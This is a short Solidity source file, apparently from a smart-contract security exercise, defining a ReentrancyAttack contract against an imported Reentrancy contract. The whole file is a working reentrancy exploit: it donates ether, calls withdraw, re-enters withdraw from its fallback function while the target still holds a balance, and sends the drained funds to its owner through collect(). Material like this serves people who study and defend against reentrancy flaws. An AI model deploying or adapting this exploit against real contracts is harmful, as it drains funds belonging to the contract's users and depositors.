// SPDX-License-Identifier: MIT

pragma solidity ^0.6.12;

import "./Reentrancy.sol";

contract ReentrancyAttack {
    Reentrancy public reentrancy;
    address payable owner;

    constructor(Reentrancy _reentrancy) public {
        reentrancy = _reentrancy;
        owner = msg.sender;
    }

    function attack() public payable {
        require(msg.value > 0);
        reentrancy.donate{value: msg.value}(address(this));
        reentrancy.withdraw(msg.value);
    }

    function collect() public {
        owner.transfer(address(this).balance);
    }

    fallback() external payable {
        if (address(reentrancy).balance >= msg.value) {
            reentrancy.withdraw(msg.value);
        }
    }
}
